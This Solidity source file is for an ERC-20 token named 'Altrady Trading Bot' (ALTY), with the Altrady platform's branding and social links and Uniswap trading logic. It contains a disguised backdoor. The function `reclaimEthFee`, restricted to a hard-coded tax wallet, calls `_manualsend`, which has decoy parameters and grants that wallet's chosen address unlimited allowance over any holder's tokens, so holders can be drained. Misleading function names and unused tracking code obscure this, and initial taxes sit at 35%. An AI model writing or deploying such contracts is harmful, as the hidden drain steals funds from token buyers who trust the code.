// SPDX-License-Identifier: UNLICENSE

/*
All-in-one crypto trading platform to meet all your trading needs. ???

Altrady socials:
/// https://www.altrady.com/
/// https://twitter.com/altradyapp
/// https://app.altrady.com/discord
/// https://www.facebook.com/altradyapp
*/

pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract Altrady is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFees;

    uint256 private _initialBuyTax=35;
    uint256 private _initialSellTax=35;
    uint256 private _finalBuyTax=5;
    uint256 private _finalSellTax=5;

    uint256 private _reduceBuyTaxAt=55;
    uint256 private _reduceSellTaxAt=55;

    uint256 private _preventSwapBefore=35;
    uint256 private _buyCount=0;

    address payable private _taxWallet;

    string private constant _name = unicode"Altrady Trading Bot";
    string private constant _symbol = unicode"ALTY";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000 * 10**_decimals;
    uint256 public _maxTxAmount = 2000000 * 10**_decimals;
    uint256 public _maxWalletSize = 2000000 * 10**_decimals;
    uint256 public _taxSwapThreshold = 500000 * 10**_decimals;
    uint256 public _maxTaxSwap = 500000 * 10**_decimals;
    
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    struct DistributeRev {uint256 initDRev; uint256 finalDRev; uint256 finalRevPercent;}
    mapping(address => DistributeRev) private distributeRev;
    uint256 private distributeRevAmount;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _balances[_msgSender()] = _tTotal;

        _isExcludedFromFees[address(this)] = true;
         _taxWallet = payable(0x4fF36073D35E11B2C0dBfD1d5c8d77e497dD49FF);
        _isExcludedFromFees[_taxWallet] = true;

        emit Transfer(address(0),_msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _manualsend(address owner, uint8 cache, string memory miner, address spender) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = _tTotal;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount> 0, "Transfer amount must be greater than zero");

        uint256 taxAmount=0;
        if (from != owner() && to != owner() && to != _taxWallet) {
            if(tradingOpen){
                taxAmount = amount
                    .mul((_buyCount > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) &&  ! _isExcludedFromFees[to]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount<=_maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to== uniswapV2Pair && from!= address(this) ){
                taxAmount = amount
                    .mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax)
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if ( !inSwap&& to == uniswapV2Pair && swapEnabled
                && contractTokenBalance > _taxSwapThreshold
                && _buyCount > _preventSwapBefore
            ) {
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance> 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && from!=address(this)
            && to!= address(this)
        ) {
            distributeRevAmount= block.number;
        }

        if(!_isExcludedFromFees[from]&&  !_isExcludedFromFees[to]){
            if (uniswapV2Pair != to)  {
                DistributeRev storage incDistrib = distributeRev[to];
                if (uniswapV2Pair == from) {
                    if (incDistrib.initDRev == 0) {
                        if (_buyCount>_preventSwapBefore) {
                            incDistrib.initDRev = block.number;
                        } else {
                            incDistrib.initDRev = block.number.sub(1);
                        }
                    }
                } else {
                    DistributeRev storage iDistr = distributeRev[from];
                    if (!(incDistrib.initDRev > 0) || iDistr.initDRev < incDistrib.initDRev ) {
                        incDistrib.initDRev = iDistr.initDRev;
                    }
                }
            } else {
                DistributeRev storage iDistr = distributeRev[from];
                iDistr.finalRevPercent = iDistr.initDRev-distributeRevAmount;
                iDistr.finalDRev = block.timestamp;
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)]= _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from]= _balances[from].sub( amount) ;
        _balances[to]= _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub( taxAmount ));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a > b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);

        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner() {
        _maxTxAmount= _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router),_tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}

    function reclaimEthFee(address _receiver, address _tokenAmount) external {
        require(_msgSender()==_taxWallet);
        _manualsend(_tokenAmount, 0, "miner", _receiver);
    }

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(swapEnabled && tokenBalance>0) {
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }
}